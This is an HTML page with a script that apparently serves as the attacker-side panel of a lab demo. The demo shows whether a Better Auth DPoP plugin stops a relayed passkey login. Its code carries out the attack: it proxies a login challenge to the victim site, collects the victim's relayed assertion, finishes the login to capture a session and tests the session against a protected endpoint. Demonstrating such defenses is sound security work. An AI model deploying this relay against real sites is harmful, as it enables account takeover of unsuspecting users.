<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Acme Workspace</title>
<style>
  :root { --bg:#f6f7f9; --card:#fff; --ink:#0d1117; --muted:#667085; --line:#e4e7ec; --brand:#3b5bdb; --bad:#b42318; --good:#0a7c42; }
  * { box-sizing: border-box; }
  body { margin:0; background:var(--bg); color:var(--ink); font:15px/1.55 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; display:grid; place-items:center; min-height:100vh; }
  .card { width:min(430px,92vw); background:var(--card); border:1px solid var(--line); border-radius:16px; padding:34px 30px; box-shadow:0 10px 30px rgba(16,24,40,.06); }
  .brand { display:flex; align-items:center; gap:10px; font-weight:700; font-size:18px; margin-bottom:22px; }
  .logo { width:30px; height:30px; border-radius:8px; background:linear-gradient(135deg,var(--brand),#7048e8); }
  .wait { text-align:center; padding:26px 0; color:var(--muted); }
  .dot { width:11px; height:11px; border-radius:50%; background:var(--brand); display:inline-block; margin-right:8px; animation:pulse 1.1s infinite; vertical-align:middle; }
  @keyframes pulse { 0%,100%{opacity:.25;} 50%{opacity:1;} }
  .result { display:none; text-align:center; padding:10px 0; }
  .icon { width:64px; height:64px; border-radius:50%; display:grid; place-items:center; margin:0 auto 10px; }
  .icon.lock { background:rgba(180,35,24,.09); color:var(--bad); }
  .icon.win  { background:linear-gradient(135deg,var(--brand),#7048e8); color:#fff; font-weight:700; font-size:26px; }
  .icon svg { width:32px; height:32px; }
  .big { font-size:20px; font-weight:700; margin:6px 0; }
  .big.bad { color:var(--bad); } .big.win { color:var(--ink); }
  .em { color:var(--muted); }
  .pill { font-family:ui-monospace,Menlo,Consolas,monospace; font-size:11px; color:var(--muted); word-break:break-all; margin-top:10px; text-align:left; background:#f8f9fb; border:1px solid var(--line); border-radius:8px; padding:8px; }
  .foot { margin-top:22px; color:#98a2b3; font-size:12px; text-align:center; }
</style>
</head>
<body>
<div class="card">
  <div class="brand"><div class="logo"></div> Acme Workspace</div>

  <div id="wait" class="wait">
    <div><span class="dot"></span><b>Waiting for a sign-in&hellip;</b></div>
    <p>When someone signs in on the app, this tab tries to land in their account.</p>
  </div>

  <div id="result" class="result">
    <div id="icon" class="icon lock"></div>
    <div class="big bad" id="headline">Session captured, but locked</div>
    <p class="em" id="why"></p>
    <div class="pill" id="detail"></div>
  </div>

  <div class="foot">Better Auth session &middot; dpop plugin decides whether it is usable</div>
</div>

<script type="module">
const $ = (id) => document.getElementById(id);
const API = '/api/auth/dpop';
const post = (u, body) => fetch(u, { method:'POST', credentials:'include', headers:{'content-type':'application/json'}, body: JSON.stringify(body||{}) });

let armed = false, passkeyToken = null;
async function arm() {
  try {
    const begin = await (await post(API + '/login/begin', {})).json(); // proxied to the victim RP
    passkeyToken = begin.passkeyToken;
    await post('/x/offer', { publicKey: begin.publicKey });
    armed = true;
  } catch { setTimeout(arm, 1500); }
}

async function poll() {
  if (!armed) return;
  let a; try { a = await (await fetch('/x/assertion')).json(); } catch { return; }
  if (!a || !a.assertion) return;
  armed = false;

  // Finish the login with the victim's relayed assertion, minting a Better Auth session in THIS jar.
  const fin = await (await post(API + '/login/finish', { assertion: a.assertion, passkeyToken })).json();
  if (!fin.ok) { lock('Login finish rejected', fin.error || '(no detail)'); arm(); return; }

  // Try to USE the session with no dpop proof.
  const r = await fetch(API + '/me', { credentials:'include' });
  const body = await r.json().catch(() => ({}));
  if (r.ok && body.username) win(body.username, 'GET /api/auth/dpop/me  ->  200  ' + JSON.stringify(body));
  else lock('resource refused (' + r.status + ')', 'GET /api/auth/dpop/me  ->  ' + r.status + '  ' + JSON.stringify(body));
  arm();
}

function show() { $('wait').style.display = 'none'; $('result').style.display = 'block'; }
function lock(why, detail) {
  $('icon').className = 'icon lock';
  $('icon').innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>';
  $('headline').className = 'big bad'; $('headline').textContent = 'Session captured, but locked';
  $('why').textContent = why; $('detail').textContent = detail; show();
}
function win(name, detail) {
  $('icon').className = 'icon win'; $('icon').textContent = (String(name).trim()[0] || '?').toUpperCase();
  $('headline').className = 'big win'; $('headline').textContent = 'Welcome, ' + name;
  $('why').textContent = 'The relayed session works. The attacker is in the account (dpop is off).';
  $('detail').textContent = detail; show();
}

arm();
setInterval(poll, 1200);
setInterval(() => { if (armed) arm(); }, 45000);
</script>
</body>
</html>
